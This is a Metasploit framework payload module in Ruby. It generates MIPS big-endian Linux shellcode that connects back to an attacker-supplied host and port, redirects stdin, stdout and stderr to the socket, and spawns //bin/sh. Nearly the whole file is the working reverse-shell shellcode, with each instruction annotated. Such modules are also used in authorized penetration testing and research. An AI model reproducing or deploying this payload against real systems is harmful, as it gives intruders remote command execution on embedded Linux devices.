##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        =>
        [
          'rigan <imrigan[at]gmail.com>', # Original shellcode
          'juan vazquez' # Metasploit module
        ],
      'References'    =>
        [
          'EDB' => '18226',
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        })
    )
  end

  def generate
    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
      return super
    end

    host = Rex::Socket.addr_atoi(datastore['LHOST'])
    port = Integer(datastore['LPORT'])

    host = [host].pack("N").unpack("cccc")
    port = [port].pack("n").unpack("cc")

    shellcode =
      # sys_socket
      # a0: domain
      # a1: type
      # a2: protocol
      "\x24\x0f\xff\xfa" + # li t7,-6
      "\x01\xe0\x78\x27" + # nor t7,t7,zero
      "\x21\xe4\xff\xfd" + # addi a0,t7,-3
      "\x21\xe5\xff\xfd" + # addi a1,t7,-3
      "\x28\x06\xff\xff" + # slti a2,zero,-1
      "\x24\x02\x10\x57" + # li v0,4183 # sys_socket
      "\x01\x01\x01\x0c" + # syscall 0x40404

      # sys_connect
      # a0: sockfd (stored on the stack)
      # a1: addr (data stored on the stack)
      # a2: addrlen
      "\xaf\xa2\xff\xff" + # sw v0,-1(sp)
      "\x8f\xa4\xff\xff" + # lw a0,-1(sp)
      "\x34\x0f\xff\xfd" + # li t7,0xfffd
      "\x01\xe0\x78\x27" + # nor t7,t7,zero
      "\xaf\xaf\xff\xe0" + # sw t7,-32(sp)
      "\x3c\x0e" + port.pack("C2") + # lui t6,0x1f90
      "\x35\xce" + port.pack("C2") + # ori t6,t6,0x1f90
      "\xaf\xae\xff\xe4" + # sw t6,-28(sp)
      "\x3c\x0e" + host[0..1].pack("C2") + # lui t6,0x7f01
      "\x35\xce" + host[2..3].pack("C2") + # ori t6,t6,0x101
      "\xaf\xae\xff\xe6" + # sw t6,-26(sp)
      "\x27\xa5\xff\xe2" + # addiu a1,sp,-30
      "\x24\x0c\xff\xef" + # li t4,-17
      "\x01\x80\x30\x27" + # nor a2,t4,zero
      "\x24\x02\x10\x4a" + # li v0,4170  # sys_connect
      "\x01\x01\x01\x0c" + # syscall 0x40404

      # sys_dup2
      # a0: oldfd (socket)
      # a1: newfd (0, 1, 2)
      "\x24\x0f\xff\xfd" + # li t7,-3
      "\x01\xe0\x78\x27" + # nor t7,t7,zero
      "\x8f\xa4\xff\xff" + # lw a0,-1(sp)
      "\x01\xe0\x28\x21" + # move a1,t7
      "\x24\x02\x0f\xdf" + # li v0,4063 # sys_dup2
      "\x01\x01\x01\x0c" + # syscall 0x40404
      "\x24\x10\xff\xff" + # li s0,-1
      "\x21\xef\xff\xff" + # addi t7,t7,-1
      "\x15\xf0\xff\xfa" + # bne t7,s0,68 <dup2_loop>

      # sys_execve
      # a0: filename (stored on the stack) "//bin/sh"
      # a1: argv "//bin/sh"
      # a2: envp (null)
      "\x28\x06\xff\xff" + # slti a2,zero,-1
      "\x3c\x0f\x2f\x2f" + # lui t7,0x2f2f "//"
      "\x35\xef\x62\x69" + # ori t7,t7,0x6269 "bi"
      "\xaf\xaf\xff\xec" + # sw t7,-20(sp)
      "\x3c\x0e\x6e\x2f" + # lui t6,0x6e2f "n/"
      "\x35\xce\x73\x68" + # ori t6,t6,0x7368 "sh"
      "\xaf\xae\xff\xf0" + # sw t6,-16(sp)
      "\xaf\xa0\xff\xf4" + # sw zero,-12(sp)
      "\x27\xa4\xff\xec" + # addiu a0,sp,-20
      "\xaf\xa4\xff\xf8" + # sw a0,-8(sp)
      "\xaf\xa0\xff\xfc" + # sw zero,-4(sp)
      "\x27\xa5\xff\xf8" + # addiu a1,sp,-8
      "\x24\x02\x0f\xab" + # li v0,4011 # sys_execve
      "\x01\x01\x01\x0c"  # syscall 0x40404

    return super + shellcode
  end

end
